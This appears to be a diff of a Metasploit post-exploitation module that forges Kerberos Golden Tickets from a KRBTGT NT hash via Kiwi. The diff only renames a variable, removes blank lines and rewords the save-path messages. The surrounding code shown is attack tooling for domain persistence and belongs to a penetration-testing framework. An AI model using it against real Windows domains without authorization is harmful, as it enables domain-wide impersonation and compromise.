@@ -4,7 +4,6 @@
 ##
 require 'metasploit/framework/hashes'
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::NetAPI
   include Msf::Post::Windows::Accounts
@@ -66,7 +65,6 @@ class MetasploitModule < Msf::Post
     id = datastore['ID'] || 0
     end_in = datastore['END_IN'] || 87608
 
-
     unless domain
       print_status('Searching for the domain...')
       domain = get_domain
@@ -118,14 +116,14 @@ class MetasploitModule < Msf::Post
     if Metasploit::Framework::Hashes.identify_hash(krbtgt_hash) != 'nt'
       fail_with(Failure::BadConfig, 'KRBTGT_HASH must be an NTHash')
     end
-    krbtgt_hash = krbtgt_hash.split(':')[1]
+    nt_hash = krbtgt_hash.split(':')[1]
 
     print_status("Creating Golden Ticket for #{domain}\\#{user}...")
     ticket = client.kiwi.golden_ticket_create({
       user: user,
       domain_name: domain,
       domain_sid: domain_sid,
-      krbtgt_hash: krbtgt_hash,
+      krbtgt_hash: nt_hash,
       id: id,
       group_ids: datastore['GROUPS'],
       end_in: end_in
@@ -140,7 +138,7 @@ class MetasploitModule < Msf::Post
                                    kirbi_ticket,
                                    "#{domain}\\#{user}-golden_ticket.kirbi",
                                    "#{domain}\\#{user} Golden Ticket")
-      print_status("Ticket saved to #{kirbi_location}")
+      print_status("Kirbi ticket saved to #{kirbi_location}")
       krb_cred = Rex::Proto::Kerberos::Model::KrbCred.decode(kirbi_ticket)
 
       ccache_ticket = Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(krb_cred)
@@ -150,7 +148,7 @@ class MetasploitModule < Msf::Post
                                    ccache_ticket.to_binary_s,
                                    "#{domain}\\#{user}-golden_ticket.ccache",
                                    "#{domain}\\#{user} Golden Ticket")
-      print_status("Ticket saved to #{ccache_location}")
+      print_status("ccache ticket saved to #{ccache_location}")
 
       if datastore['USE']
         print_status("Attempting to use the ticket...")
